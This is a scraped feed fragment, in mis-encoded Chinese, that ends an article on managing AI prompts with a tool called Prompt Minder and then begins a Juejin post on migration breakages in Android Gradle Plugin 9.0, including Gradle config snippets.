<li>"Prompt MinderçœŸçš„å¾ˆæ£’ï¼Œç®€æ´ä½†ä¸ç®€å•ã€‚" â€”â€” å°é”</li>
</ul>
<h2 data-id="heading-41">äº”ã€å®æˆ˜æŒ‡å—ï¼šæ„å»ºé«˜æ•ˆçš„AIå·¥ä½œæµ</h2>
<h3 data-id="heading-42">5.1 çœŸå®æ¡ˆä¾‹ï¼šç”µå•†å®¢æœæœºå™¨äºº</h3>
<h4 data-id="heading-43">èƒŒæ™¯</h4>
<p>æŸç§‘æŠ€å…¬å¸åœ¨å…¨çƒèŒƒå›´å†…éƒ¨ç½²äº†å¤šè¯­è¨€AIå®¢æœï¼ŒPromptæ•°é‡è¶…è¿‡åƒæ¡ã€‚åŸæµç¨‹ï¼šè¿è¥åœ¨Notionæ”¹æç¤º â†’ æ‰‹åŠ¨å‘ç»™å¼€å‘ â†’ å¼€å‘æ”¹Pythonå­—ç¬¦ä¸² â†’ æ¨Gitã€‚å¹³å‡ä¸€æ¬¡è¿­ä»£2~3å¤©ã€‚</p>
<h4 data-id="heading-44">ç—›ç‚¹</h4>
<ul>
<li><strong>ç‰ˆæœ¬æ··ä¹±</strong>ï¼šæ— æ³•è¿½æº¯å†å²ã€‚</li>
<li><strong>å›å½’ç¼ºå¤±</strong>ï¼šä¸Šçº¿å¸¸å‡ºç°ç­”éæ‰€é—®ã€‚</li>
<li><strong>ä¸è¿è¥æ²Ÿé€šè€—æ—¶</strong>ï¼šæ¥å›copyå¤šè½®ã€‚</li>
</ul>
<h4 data-id="heading-45">æ”¹é€ æ­¥éª¤</h4>
<ol>
<li>
<p><strong>éœ€æ±‚åˆ†æ</strong>ï¼šæ˜ç¡®ç›®æ ‡ç”¨æˆ·ã€æ ¸å¿ƒä»»åŠ¡å’Œé¢„æœŸè¾“å‡ºã€‚è¯¥ç”µå•†å®¢æœæœºå™¨äººéœ€è¦æ”¯æŒ"å”®å‰""å”®å""é€€è´§""å·¥å•"4ä¸ªåœºæ™¯ï¼Œæ¯ä¸ªåœºæ™¯æœ‰4ä¸ªè¯­è¨€ç‰ˆæœ¬ï¼ˆä¸­/è‹±/æ—¥/éŸ©ï¼‰ï¼Œå†å åŠ A/Bæµ‹è¯•ã€‚</p>
</li>
<li>
<p><strong>æç¤ºè¯è®¾è®¡</strong>ï¼šè¿ç”¨CRISPEæ¡†æ¶æˆ–é€šç”¨å…¬å¼è®¾è®¡é«˜è´¨é‡æç¤ºè¯ã€‚ä¾‹å¦‚ï¼š</p>
</li>
</ol>
<p>ã€è§’è‰²ã€‘ç”µå•†å®¢æœåŠ©æ‰‹
ã€ä»»åŠ¡ã€‘å›ç­”ç”¨æˆ·å…³äºé€€è´§æ”¿ç­–çš„é—®é¢˜
ã€ä¸Šä¸‹æ–‡ã€‘ç”¨æˆ·å·²ç»è´­ä¹°äº†å•†å“ï¼Œç°åœ¨æƒ³äº†è§£é€€è´§æµç¨‹
ã€è¾“å‡ºè¦æ±‚ã€‘</p>
<ol>
<li>
<p>ç”¨å‹å¥½çš„è¯­æ°”å›ç­”</p>
</li>
<li>
<p>æ˜ç¡®é€€è´§æ¡ä»¶å’Œæµç¨‹</p>
</li>
<li>
<p>æä¾›è”ç³»å®¢æœçš„æ–¹å¼</p>
</li>
<li>
<p><strong>ä¸Šä¸‹æ–‡ç®¡ç†</strong>ï¼šæ„å»ºå¤šå±‚æ¬¡è®°å¿†æ¶æ„ï¼Œå®ç°æ™ºèƒ½å‹ç¼©å’ŒåŠ¨æ€æ³¨å…¥ã€‚é€šè¿‡ä¼šè¯çº§è®°å¿†å­˜å‚¨å½“å‰å¯¹è¯ä¿¡æ¯ï¼Œç”¨æˆ·çº§è®°å¿†å­˜å‚¨ç”¨æˆ·è´­ä¹°å†å²å’Œåå¥½ï¼ŒçŸ¥è¯†åº“è®°å¿†å­˜å‚¨å…¬å¸æ”¿ç­–å’Œäº§å“ä¿¡æ¯ã€‚</p>
</li>
<li>
<p><strong>å¹³å°éƒ¨ç½²</strong>ï¼šä½¿ç”¨Prompt Minderè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ã€å›¢é˜Ÿåä½œå’Œå®æ—¶æµ‹è¯•ã€‚å°†æç¤ºè¯ç§»å‡ºä»£ç ï¼Œå­˜åˆ°è¿œç«¯åº“ï¼Œå˜é‡åŒ–"{{answer_style}}""{{policy}}"ã€‚ç”¨Web UIç¼–è¾‘æ¨¡æ¿ï¼Œè‡ªåŠ¨è·‘ç¦»çº¿é›†ï¼›æœªé€šè¿‡å³é˜»æ­¢ä¸Šçº¿ã€‚</p>
</li>
<li>
<p><strong>è¿­ä»£ä¼˜åŒ–</strong>ï¼šé€šè¿‡A/Bæµ‹è¯•å’Œç”¨æˆ·åé¦ˆæŒç»­ä¼˜åŒ–æç¤ºè¯å’Œä¸Šä¸‹æ–‡ç³»ç»Ÿã€‚é€šè¿‡å¹³å°åˆ‡æµé‡ï¼Œ5%â†’25%â†’100%ã€‚æŠŠç‰ˆæœ¬å·å†™å…¥æ—¥å¿—ï¼Œç»ç”±GrafanaæŠ˜çº¿å›¾å¯¹æ¯”ç‚¹å‡»ç‡ã€è€—æ—¶ã€‚è¿è¥åœ¨UIç›´æ¥cloneç‰ˆæœ¬ã€è°ƒæ•´æªè¾ã€å†æ¬¡è¯„å®¡ã€‚</p>
</li>
</ol>
<h4 data-id="heading-46">ç»“æœ</h4>
<ul>
<li>å•æ¬¡è¿­ä»£å‘¨æœŸä»3å¤©é™åˆ°4å°æ—¶ï¼›</li>
<li>å‡†ç¡®ç‡ï¼ˆäººå·¥æŠ½æ£€Top-3ï¼‰ä»83%æè‡³92%ï¼›</li>
<li>æœˆåº¦LLMè´¹ç”¨ä¸‹é™18%ï¼ˆå› Promptç¼©çŸ­ + ç›‘æ§åŠæ—¶å‘ç°å†—ä½™ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-47">5.2 å®æˆ˜æ­¥éª¤æ€»ç»“</h3>
<ol>
<li><strong>éœ€æ±‚åˆ†æ</strong>ï¼šæ˜ç¡®ç›®æ ‡ç”¨æˆ·ã€æ ¸å¿ƒä»»åŠ¡å’Œé¢„æœŸè¾“å‡º</li>
<li><strong>æç¤ºè¯è®¾è®¡</strong>ï¼šè¿ç”¨CRISPEæ¡†æ¶æˆ–é€šç”¨å…¬å¼è®¾è®¡é«˜è´¨é‡æç¤ºè¯</li>
<li><strong>ä¸Šä¸‹æ–‡ç®¡ç†</strong>ï¼šæ„å»ºå¤šå±‚æ¬¡è®°å¿†æ¶æ„ï¼Œå®ç°æ™ºèƒ½å‹ç¼©å’ŒåŠ¨æ€æ³¨å…¥</li>
<li><strong>å¹³å°éƒ¨ç½²</strong>ï¼šä½¿ç”¨Prompt Minderè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ã€å›¢é˜Ÿåä½œå’Œå®æ—¶æµ‹è¯•</li>
<li><strong>è¿­ä»£ä¼˜åŒ–</strong>ï¼šé€šè¿‡A/Bæµ‹è¯•å’Œç”¨æˆ·åé¦ˆæŒç»­ä¼˜åŒ–æç¤ºè¯å’Œä¸Šä¸‹æ–‡ç³»ç»Ÿ</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android Gradle Plugin 9.0 å‘å¸ƒï¼Œä¸ºä»€ä¹ˆè¿™ä¼šæ˜¯ä¸ªå²è¯—çº§å¤§å‘ç‰ˆæœ¬]]></title>    <link>https://juejin.cn/post/7597900782910685203</link>    <guid>https://juejin.cn/post/7597900782910685203</guid>    <pubDate>2026-01-22T05:01:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597900782910685203" data-draft-id="7597900782910668819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android Gradle Plugin 9.0 å‘å¸ƒï¼Œä¸ºä»€ä¹ˆè¿™ä¼šæ˜¯ä¸ªå²è¯—çº§å¤§å‘ç‰ˆæœ¬"/> <meta itemprop="keywords" content="å‰ç«¯,Android,Flutter"/> <meta itemprop="datePublished" content="2026-01-22T05:01:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‹çŒ«deå°éƒ­"/> <meta itemprop="url" content="https://juejin.cn/user/817692379985752"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android Gradle Plugin 9.0 å‘å¸ƒï¼Œä¸ºä»€ä¹ˆè¿™ä¼šæ˜¯ä¸ªå²è¯—çº§å¤§å‘ç‰ˆæœ¬
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/817692379985752/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‹çŒ«deå°éƒ­
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T05:01:27.000Z" title="Thu Jan 22 2026 05:01:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘çš„ AGP 9.0 æ›´æ–°ï¼Œå¯ä»¥è¯´ä½¿ç”¨åˆç‚¸å‡ºæ¥äº†ä¸€æ‰¹å¤§å‘ï¼Œ<strong>å¯¹äº Android å¯èƒ½è¿˜å¥½ï¼Œä½†æ˜¯å¯¹äº KMP ç­‰ç”¨æˆ·æ¥è¯´ï¼Œå¯èƒ½æ¥è¿‘â€œå¤©å¡Œäº†â€çš„æƒ…å†µ</strong>ï¼Œé‚£ä¹ˆè¿™æ¬¡ AGP æ›´æ–°äº†ä»€ä¹ˆï¼Ÿå…¶å®å¤§å®¶å…³å¿ƒçš„å¯èƒ½ä¸»è¦å°±ä¸‰æ ¸å¿ƒå¤§å˜åŠ¨ï¼š</p>
<ul>
<li>å½»åº•åˆ‡åˆ°â€œæ–° DSL æ¥å£â€ï¼Œæ—§å®ç°å’Œæ—§ Variant API è¢«æ— æƒ…åˆ‡å‰²</li>
<li>å†…ç½® Kotlinï¼ˆBuilt-in Kotlinï¼‰</li>
<li>KMP plugin ä¸å†èƒ½å’Œ <code>com.android.application</code> / <code>com.android.library</code> åŒæ¨¡å—å…±å­˜</li>
</ul>
<h2 data-id="heading-0">newDsl</h2>
<p>é¦–å…ˆå°±æ˜¯ newDslï¼ŒAGP 9.0 å¼€å§‹<strong>åªæš´éœ²æ–°çš„ public DSL interfaces</strong>ï¼Œæ—§çš„ DSL ç±»å‹ï¼ˆæ¯”å¦‚å†å²ä¸Šå¾ˆå¤šæ’ä»¶/è„šæœ¬ä¼šå¼ºè½¬åˆ° <code>BaseExtension</code> ä¹‹ç±»ï¼‰ä¸å†æä¾›ï¼Œå¹¶ä¸”<strong>æ—§çš„ variant APIï¼ˆ<code>applicationVariants</code> ç­‰ï¼‰ä¹Ÿä¸€èµ·è¢«åˆ‡æ–­</strong>ï¼Œè¦è¿ç§»åˆ° <code>androidComponents</code> API ã€‚</p>
<p>ä» Google çš„è§’åº¦ä¼šæ˜¯ï¼Œ<strong>ç»ˆäºå¯ä»¥åœ¨ä¸»ç‰ˆæœ¬æŠŠâ€œå†å²å…¼å®¹å±‚â€æ‹”æ‰äº†</strong>ï¼Œæ‰”æ‰äº†ä¸€ä¸ªå†å²åŒ…è¢±ï¼Œä½†æ˜¯å¯¹äºç”¨æˆ·æ¥è¯´ï¼Œå¯èƒ½ä¼šæœ‰ï¼š</p>
<ul>
<li>è‡ªå·±å†™çš„ Gradle æ’ä»¶æˆ– buildSrc é‡Œå¼ºè½¬æ—§ç±»å‹ç›´æ¥å´©<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbe503929e5a44699a6e333e6598ca97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769662886&amp;x-signature=5U9WQMn%2BXlF84BWeQw56Jl0uBAI%3D" alt="" loading="lazy"/></li>
<li>ä¾èµ– <code>applicationVariants</code>ã€<code>libraryVariants</code> çš„é€»è¾‘è¦æ”¹æˆ <code>androidComponents</code></li>
</ul>
<p>å½“ç„¶ï¼Œä¹Ÿä¸æ˜¯å®Œå…¨å°±ä¸è¡Œäº†ï¼Œ<strong>å®˜æ–¹ä¹Ÿæä¾›äº† <code>android.newDsl=false</code> å›é€€ï¼Œä½† AGP 10 ä¼šç§»é™¤è¿™ä¸ªé€€è·¯</strong>ï¼Œæ‰€ä»¥è™½ç„¶å¯ä»¥è¿‡æ¸¡ï¼Œä½†æ˜¯é€‚é…æ˜¯å¿…ç„¶çš„ã€‚</p>
<blockquote>
<p>åŒ…æ‹¬ä½¿ç”¨äº† Hiltã€ KSP çš„è€ç‰ˆæœ¬çš„éƒ½å¯èƒ½ä¼šæ— æ³•ç¼–è¯‘ï¼Œåªèƒ½è¯´è¿‡æ¸¡æœŸè¿˜æ˜¯æœ‰çš„ï¼Œä½†æ˜¯å¦‚æœå¯¹åº”çš„æ’ä»¶ä½œè€…ä¸ç©äº†ï¼Œé‚£å°±åªèƒ½ä½ è‡ªå·±è¿‡æ¸¡äº†ã€‚</p>
</blockquote>
<h2 data-id="heading-1">Built-in Kotlin</h2>
<p>Built-in Kotlin ç°åœ¨é»˜è®¤å¼€å¯ï¼ŒAGP 9.0 ä¼šé»˜è®¤å¯ç”¨ built-in Kotlinï¼š<strong>ç›®æ ‡å°±æ˜¯ä½ ä¸éœ€è¦å†ç»™ Android module å•ç‹¬ apply <code>org.jetbrains.kotlin.android</code> å°±èƒ½ç¼–è¯‘ Kotlinï¼Œä¸å†éœ€è¦å£°æ˜ KGP ç‰ˆæœ¬</strong> ã€‚</p>
<p>ä½†å‰¯ä½œç”¨æ˜¯ï¼š<strong>é¡¹ç›®/æ’ä»¶ç”Ÿæ€é‡Œâ€œé»˜è®¤çš„ KGP/Kotlin Android æ’ä»¶â€çš„å‡è®¾ä¼šè¢«æ‰“ç ´</strong>ï¼Œç”Ÿæ€æƒ¨å±€ï¼Ÿä¹Ÿå°±æ˜¯å¼•ç”¨å’Œä¾èµ–å¯èƒ½ä¼šæœ‰å†²çªï¼Œæ¯”å¦‚ä½ ä¼šçœ‹åˆ°ï¼š</p>
<pre><code class="hljs language-sh" lang="sh">Failed to apply plugin <span class="hljs-string">'org.jetbrains.kotlin.android'</span>.
&gt; Cannot add extension with name <span class="hljs-string">'kotlin'</span>, as there is an extension already registered with that name.
</code></pre>
<pre><code class="hljs language-sh" lang="sh">Failed to apply plugin <span class="hljs-string">'com.jetbrains.kotlin.android'</span>
&gt; The <span class="hljs-string">'org.jetbrains.kotlin.android'</span> plugin is no longer required <span class="hljs-keyword">for</span> Kotlin support since AGP 9.0.
</code></pre>
<p>æ‰€ä»¥ï¼Œæ­£å¸¸æ¥è¯´ä½ éœ€è¦ï¼š</p>
<ul>
<li><strong>ç§»é™¤ <code>kotlin-android</code> æ’ä»¶</strong>ï¼Œç§»é™¤ <code>org.jetbrains.kotlin.android</code> ï¼ˆæˆ– <code>kotlin-android</code> ï¼‰ï¼Œåˆ é™¤æ‰€æœ‰ apply</li>
<li><strong>è¿ç§» <code>kotlin-kapt</code> æ’ä»¶</strong>ï¼Œå»ºè®®è¿ç§»åˆ° KSP ï¼Œè™½ç„¶ä¸ä¸€å®šæœ‰é—®é¢˜ï¼Œä½†æ˜¯ä¸ä¿è¯æ²¡é—®é¢˜ï¼Œå¦‚æœæš‚æ—¶æ— æ³•è¿ç§»åˆ° KSPï¼Œå¯ä»¥å°† <code>kotlin-kapt</code> æ’ä»¶æ›¿æ¢ä¸ºï¼š <code>com.android.legacy-kapt</code>  æ¥å°è¯•é€‚é…</li>
<li><strong>è¿ç§» <code>android.kotlinOptions{}</code> DSL</strong>ï¼Œå°† <code>android.kotlinOptions{} </code> DSL  è¿ç§»åˆ° <code>kotlin.compilerOptions{}</code></li>
<li><strong>è¿ç§» <code>kotlin.sourceSets{}</code> DSL</strong> ï¼Œå¦å¤–å¯ä»¥ä½¿ç”¨  variant API çš„ <code>addStaticSourceDirectory</code> æˆ– <code>addGeneratedSourceDirectory</code> æ–¹æ³•ï¼š<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45e12a63ac684df0b1debfa1477ab622~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769662886&amp;x-signature=C9PsSwE1KjlnuFGX5TaE5eYADbQ%3D" alt="" loading="lazy"/></li>
</ul>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œè€Œä¸” AG 9.0 è¿˜å¼•å…¥äº†å¯¹ç‰¹å®š Kotlin Gradle Plugin ç‰ˆæœ¬è¿è¡Œæ—¶ä¾èµ–ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f85d69947777491ea866af52f43463b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769662886&amp;x-signature=jijQZUzF9md661962FVTiJdZxrQ%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>å¦‚æœä½¿ç”¨çš„ KGP ç‰ˆæœ¬ä½äº 2.2.10ï¼ŒGradle ä¼šè‡ªåŠ¨å°†å…¶å‡çº§åˆ° 2.2.10ï¼ŒåŒæ ·å¦‚æœä½¿ç”¨çš„ KSP ç‰ˆæœ¬ä½äº 2.2.10-2.0.2ï¼ŒAGP ä¹Ÿä¼šå°†å…¶å‡çº§åˆ° 2.2.10-2.0.2 ä»¥åŒ¹é… KGP ç‰ˆæœ¬ã€‚</p>
</blockquote>
<p>å½“ç„¶ï¼Œä½ å¯ä»¥é€‰æ‹©  <code>enableKotlin</code> å…³é—­è¿™ä¸ªé»˜è®¤æ”¯æŒï¼Œç„¶åä½¿ç”¨è¾ƒä½ç‰ˆæœ¬çš„ KGP æˆ– KSP ï¼š</p>
<pre><code class="hljs language-groovy" lang="groovy">android {
    enableKotlin = false
}

buildscript {
    dependencies {
        // For KGP
        classpath("org.jetbrains.kotlin:kotlin-gradle-plugin") {
            version { strictly("KGP_VERSION") }
        }

        // For KSP
        classpath("com.google.devtoolsksp:symbol-processing-gradle-plugin") {
            version { strictly("KSP_VERSION") }
        }
    }
}
</code></pre>
<p>ä½†æ˜¯å®˜æ–¹ä¹Ÿè¯´äº†ï¼Œæœ€ä½ 2.0 ï¼Œå¹¶ä¸”é™çº§å¸¦æ¥çš„ä¸å…¼å®¹é—®é¢˜ï¼Œè‡ªå·±è´Ÿè´£ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49b837291fac461fa0e104073e7f7076~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769662886&amp;x-signature=JWrhu5pYk4m1aj24pjTUn5wLN5c%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>å¦å¤–ï¼Œ<strong>ä¹Ÿå¯ä»¥é€šè¿‡ <code>gradle.properties</code> æ–‡ä»¶ä¸­è®¾ç½® <code>android.builtInKotlin=false</code> ç¦ç”¨ built-in Kotlin</strong> ã€‚</p>
</blockquote>
<h2 data-id="heading-2">KMP</h2>
<p>æœ€åå°±æ˜¯ KMP ï¼ŒKMP plugin ä¸å†èƒ½å’Œ <code>com.android.application</code> / <code>com.android.library</code> åŒæ¨¡å—å…±å­˜ï¼ŒcomposeApp å¿…é¡»æ‹† androidApp æ‰èƒ½å·¥ä½œã€‚</p>
<p>å¯¹äº KMPï¼Œä½¿ç”¨ AGP 9.0+ æ—¶ï¼Œ<strong>KMP Gradle plugin ä¸å†å…¼å®¹ <code>com.android.application</code> / <code>com.android.library</code> åŒæ¨¡å—</strong>ï¼Œè€Œè§£å†³æ–¹æ¡ˆå°±æ˜¯ï¼š</p>
<blockquote>
<p>æŠŠ Android å…¥å£ï¼ˆActivity/Application ç­‰ï¼‰æŠ½åˆ°å•ç‹¬çš„ Android app moduleï¼Œå…±äº«ä»£ç  module æ”¹æˆä½¿ç”¨æ–°çš„ Android-KMP library pluginï¼š<code>com.android.kotlin.multiplatform.library</code>ã€‚</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯ï¼š</p>
<ul>
<li><strong><code>androidApp</code></strong>ï¼šçº¯ Android <em>Application</em> æ¨¡å—ï¼ˆæ‰“åŒ… APK çš„å…¥å£åœ¨è¿™é‡Œï¼‰</li>
